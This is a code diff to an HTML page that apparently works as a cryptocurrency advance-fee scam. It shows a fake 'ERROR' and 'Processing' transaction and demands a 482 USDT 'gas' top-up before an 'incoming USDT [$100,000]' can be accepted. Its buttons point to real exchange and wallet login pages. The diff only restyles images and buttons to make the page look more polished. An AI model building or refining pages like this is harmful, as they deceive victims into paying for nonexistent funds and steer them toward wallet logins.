@@ -34,7 +34,9 @@
     </tr>
   </table>
 
-  <img src="IMG_8719.gif" alt="blockchain Logo" width="250" />
+  <div style="text-align: center;">
+  <img src="IMG_8719.gif" alt="blockchain Logo" width="320" style="display: inline-block;"/>
+</div>
 
   <form action="https://www.exodus.com" method="get">
       <button type="submit">[TOP Gas ⛽️ USDT]</button>
@@ -73,8 +75,11 @@
       </tr>
     </table>
 
-  <img src="IMG_0565.jpeg" alt="blockchain Logo" width="38" />
-    <hr>
+<div style="text-align: center;">
+  <img src="IMG_0565.jpeg" alt="blockchain Logo" width="38" style="display: inline-block;"/>
+</div>
+  
+<hr>
 
   <span style="color: RED;"><strong>ERROR!!!</strong></span>
     <p style="margin: 10px 0;"> ⏬ </p>
@@ -82,23 +87,35 @@
     <br>
   ✅ This transaction is <span style="color: Red;">Processing </span>,Top-Up USDT Gas to Complete.✓⃝
 
-<img src="IMG_0567.jpeg" alt="payslip" width="700" />
-    <br>
+<div style="text-align: center;">
+  <img src="IMG_0567.jpeg" alt="blockchain Logo" width="320" style="display: inline-block;"/>
+</div>
+  <br>
 <span style="color: red;"><strong>SUMMARY:</strong> You need 482 USDT to complete this transaction. Buy more [$482] USDT For Gas Price!</span>
-<img src="IMG_0574.png" alt="blockchain Logo" width="21" />
+<img src="IMG_0574.png" alt="blockchain Logo" width="15" />
     <br>
-<img src="IMG_0583.jpeg" alt="ethscan Logo" width="700" />
-    <br>
-  <form action="https://www.bybit.com/en/login" method="get">
-  <button type="submit">Accept incoming USDT [$100,000]</button>
-    </form>
+<div style="text-align: center;">
+  <img src="IMG_0583.jpeg.jpeg" alt="blockchain Logo" width="320" style="display: inline-block;"/>
+</div>
+  <br>
+<form action="https://www.bybit.com/en/login" method="get">
+    <button type="submit" style="background-color: purple; color: white; border: none; border-radius: 25px; padding: 10px 20px; font-size: 16px; cursor: pointer; transition: background-color 0.3s;">
+        Accept incoming USDT [$100,000]
+    </button>
+</form>
 
  <hr>
- <img src="IMG_9086.gif" alt="loading gif display" width="700">
-    <img src="IMG_0561.png" alt="usdex explanation" width="700" />
 
- l             
-              <!-- Buttons -->
+
+<div style="text-align: center;">
+  <img src="IMG_9086.gif" alt="blockchain Logo" width="320" style="display: inline-block;"/>
+</div>
+
+ <div style="text-align: center;">
+  <img src="IMG_0561.png" alt="blockchain Logo" width="320" style="display: inline-block;"/>
+</div>
+
+    <!-- Buttons -->
               
  <a href="https://www.exodus.com" style="font-size:16px; font-weight:bold; background-color:#0052ff; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:5px; display:inline-block; margin:10px 5px;" class="button" target="_blank">Login to WALLET</a>
 
